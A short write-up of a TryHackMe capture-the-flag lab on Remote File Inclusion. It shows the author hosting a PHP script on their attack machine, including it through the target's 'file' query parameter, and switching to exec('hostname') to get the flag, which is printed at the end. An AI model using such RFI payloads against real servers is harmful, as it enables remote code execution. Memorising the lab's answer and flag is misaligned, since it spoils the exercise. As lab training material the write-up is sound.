---
title: Remote Code Execution CTF
weight: 4
---

[Link to the exercise](https://tryhackme.com/room/fileinc)

## Goal

Contrary to [[cybersecurity/write-ups/thm/lfi-ctf-1]] and later ones, this CTF is about finding a flag hidden as a `hostname` with [[cybersecurity/knowledge/pentesting/RFI|Remote File Inclusion]].

## Steps

### Recce

I've opened the web app and tried to `include` a bunch of files that might exist already in the filesystem ([[cybersecurity/knowledge/pentesting/LFI]]) - to no avail. Since the challenge is about [[cybersecurity/knowledge/pentesting/RFI]], I've written a simple PHP script that'd echo a string to see if RFI is possible _out-of-the-box_:

```php
<?php
echo "hostname";
?>
```

Since I didn't know where to host that file, I've started `SimpleHTTPServer` with

```sh
python -m http.server ~/Desktop
```

(as I saved my script on the desktop).

Then I tried to `include` it as a query param:

```
http://10.10.55.248/playground.php?file=http://10.10.224.87:8000/hostname.php
```

(where `.55.248` is the attacked machine and `.224.87` is my AttackBox instance).

![[assets/Screenshot 2023-01-04 at 21.18.30.png]]

Good. The string was included.

### Exploitation

Since I've found the vulnerability, I've modified my script a bit to use PHPs' [exec fn](https://www.php.net/manual/en/function.exec.php):

```php
<?php
echo exec("hostname");
?>
```

and refreshed the page.

## Flag

`lfi-vm-thm-f8c5b1a78692`
